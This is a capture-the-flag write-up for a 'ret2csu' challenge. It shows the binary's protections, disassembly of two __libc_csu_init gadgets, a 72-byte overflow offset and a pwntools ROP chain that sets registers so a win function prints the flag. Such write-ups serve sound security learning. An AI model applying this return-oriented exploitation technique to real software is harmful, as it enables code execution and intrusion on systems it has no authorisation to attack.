# RET2CSU

## Solution


Initially from the binary I can see that there is No PIE
```
/root/workspace/ret2csu/chal.bin
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

I also know that the binary has libc_csu_init from the disassembly. My main focus will be on these two sections as they house the two main gadgets I will be using.

```
00400940  4c89fa             mov     rdx, r15
00400943  4c89f6             mov     rsi, r14
00400946  4489ef             mov     edi, r13d
00400949  41ff14dc           call    qword [r12+rbx*8]
0040094d  4883c301           add     rbx, 0x1
00400951  4839dd             cmp     rbp, rbx
00400954  75ea               jne     0x400940

00400956  4883c408           add     rsp, 0x8
0040095a  5b                 pop     rbx {__saved_rbx}
0040095b  5d                 pop     rbp {__saved_rbp}
0040095c  415c               pop     r12 {__saved_r12}
0040095e  415d               pop     r13 {__saved_r13}
00400960  415e               pop     r14 {__saved_r14}
00400962  415f               pop     r15 {__saved_r15}
00400964  c3                 retn     {__return_addr}
```
For the overflow, I used cyclic to calculate the size in GDB. This necessary overflow size was 72. 

The second part that I looked at was the win and lose functions. The win function was called inside the lose function and displayed multiple arguments.

```
return win(1, 2, 3, 4, 5, 6);
```

However, setting these registers is different as there is an hidden calling convention. To set the last three registers. I will have to use r12, r13, and r14. This is not that much of a problem because of the order of the chain that I will use. 

For the chain, I'll use the r13-15 registers to set rdi, rsi, and rdx respectively. I'll call the second gadget first to pop the values I want and then call the first gadget. For rbx and r12, I will set r12 to a fini pointer and rbx to 0 to bypass the call in the first gadget. Then, I'll add more values to the stack so that I can reuse the second gadget once the first gadget continues execution. This allows me to set all the registers. The chain is listed below:

```
chain += p64(e.sym['__libc_csu_init'] + 90)          # first gadget
chain += p64(0)
chain += p64(0x1)
chain += p64(fini_ptr)                               # r12 = ptr to _fini
chain += p64(0xbe)                                   # rdi = 0xbe
chain += p64(0xb01d)                                 # rsi = 0xb01d
chain += p64(0xface)                                 # rdx = 0xface

chain += p64(e.sym['__libc_csu_init'] + 64)          # second gadget
chain += p64(0)                                      # padding
chain += p64(0x1)       
chain += p64(0x1)
chain += p64(0xbad)                                   # r12 = 0xbad                                     
chain += p64(0xd0)                                    # r13 = 0xd0
chain += p64(0xc4a53)                                 # r14 = 0xc4a53
```

I then call the win function when the final return in the second gadget is hit to display the flag.